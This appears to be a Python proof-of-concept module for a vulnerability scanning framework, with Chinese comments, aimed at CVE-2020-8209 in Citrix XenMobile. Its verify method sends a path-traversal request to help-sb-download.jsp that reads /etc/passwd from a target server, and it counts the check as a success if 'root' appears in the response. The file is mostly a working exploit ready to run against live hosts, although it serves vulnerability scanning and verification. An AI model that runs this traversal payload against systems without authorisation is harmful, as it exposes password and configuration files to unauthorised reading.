from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin          # 导入其他的脚本需要用到的模块


POC_NAME = "CitrixXenMobileReadFile"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CitrixXenMobileReadFile(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0010',    # PoC的VID编号
            'vbid': '',
            'Name': 'Citrix XenMobile Read FIle',    # PoC名称
            'Author': 'fishr',    # PoC作者
            'Create_date': '2021-6-16',    # PoC创建时间
            },

        'vul': {
            'Product': 'Citrix XenMobile',    # 漏洞所在产品名称
            'Version': '4.0',    # 产品的版本号
            'Type': 'ReadFile',    # 漏洞类型
            'Severity': 'medium',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                XenMobile是Citrix开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。
                该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 
                CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-16',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }

        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'get', headers=headers, allow_redirects=False)
        if resp is not None:
            location = resp.text

        if "root" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight('[*] CitrixXenMobile ReadFile CVE-2020-8209 Found')    # 打印高亮信息发现漏洞，其他可用方法
        else:
            if verbose:
                highlight('[*] CitrixXenMobile ReadFile CVE-2020-8209 not Found')    # 打印高亮信息发现漏洞，其他可用方法

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
